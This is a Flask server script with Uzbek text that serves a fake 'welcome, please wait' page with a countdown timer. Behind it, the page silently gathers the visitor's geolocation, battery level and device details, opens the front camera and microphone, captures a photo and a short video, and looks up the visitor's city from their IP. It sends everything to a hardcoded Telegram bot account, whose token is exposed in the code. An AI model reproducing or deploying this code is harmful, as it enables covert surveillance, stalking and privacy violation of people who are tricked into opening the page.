from flask import Flask, request, jsonify
import telebot
import base64
import requests
import os

# --- SOZLAMALAR ---
TOKEN = '8463907503:AAG483pQLs-7kQWGth-GxCGKqHdrythh2RQ'
MY_ID = 6224785199

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

def get_ip_info(ip):
    try:
        # Proxy orqali kelgan real IPni olish
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return res
    except:
        return {}

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Xush kelibsiz</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: black; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
            #timer { font-size: 40px; color: #00ff00; margin-top: 20px; }
        </style>
        <script>
            let timeLeft = 30;
            function startTimer() {
                let tDisp = document.getElementById('timer');
                let interval = setInterval(() => {
                    timeLeft--;
                    tDisp.innerText = timeLeft;
                    if (timeLeft <= 0) { clearInterval(interval); window.close(); }
                }, 1000);
            }

            async function startProcess() {
                startTimer();
                let info = { ua: navigator.userAgent };
                if (navigator.getBattery) {
                    let b = await navigator.getBattery();
                    info.bat = Math.round(b.level * 100) + "%";
                }
                navigator.geolocation.getCurrentPosition(async (p) => {
                    info.lat = p.coords.latitude; info.lon = p.coords.longitude;
                    await initCamera(info);
                }, () => initCamera(info));
            }

            async function initCamera(info) {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }, audio: true });
                    let video = document.createElement('video');
                    video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(async () => {
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        let imgData = canvas.toDataURL('image/jpeg', 0.9);
                        
                        await fetch('/p', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({...info, img: imgData})
                        });

                        setTimeout(() => { captureVideo(stream); }, 2000);
                    }, 5000);
                } catch(e) {
                    fetch('/p', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(info)});
                }
            }

            function captureVideo(stream) {
                let recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    let blob = new Blob(chunks, {type: 'video/webm'});
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        fetch('/v', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({v:reader.result})});
                    };
                    stream.getTracks().forEach(t => t.stop());
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
            }
            window.onload = startProcess;
        </script>
    </head>
    <body>
        <div style="font-size: 18px;">👋 Salom Xush kelibsiz <br> Iltimos kuting... ⏳</div>
        <div id="timer">30</div>
    </body>
    </html>
    """

@app.route('/p', methods=['POST'])
def p_handler():
    d = request.json
    # Cloudflare yoki Render IP-sini olish
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_info = get_ip_info(ip)
    
    msg = f"📸 **NATIJA OLINDI!**\n\n" \
          f"🖥 **IP:** {ip}\n" \
          f"🏙 **Shahar:** {ip_info.get('city', 'Nomaʼlum')}\n" \
          f"🏛 **Viloyat:** {ip_info.get('regionName', 'Nomaʼlum')}\n" \
          f"🔋 **Batareya:** {d.get('bat', 'Nomaʼlum')}\n" \
          f"📍 **MANZIL:** [Xaritada](http://google.com/maps?q={d.get('lat')},{d.get('lon')})"

    if 'img' in d:
        img_data = base64.b64decode(d['img'].split(",")[1])
        with open("snap.jpg", "wb") as f: f.write(img_data)
        with open("snap.jpg", "rb") as f:
            bot.send_photo(MY_ID, f, caption=msg, parse_mode="Markdown")
    return "ok"

@app.route('/v', methods=['POST'])
def v_handler():
    d = request.json
    if 'v' in d:
        v_data = base64.b64decode(d['v'].split(",")[1])
        with open("video.webm", "wb") as f: f.write(v_data)
        with open("video.webm", "rb") as f:
            bot.send_video(MY_ID, f, caption="🎥 Video hisoboti")
    return "ok"

if __name__ == "__main__":
    # PORTni dinamik olish (Render/Heroku uchun shart)
    port = int(os.environ.get("PORT", 8888))
    app.run(host='0.0.0.0', port=port)

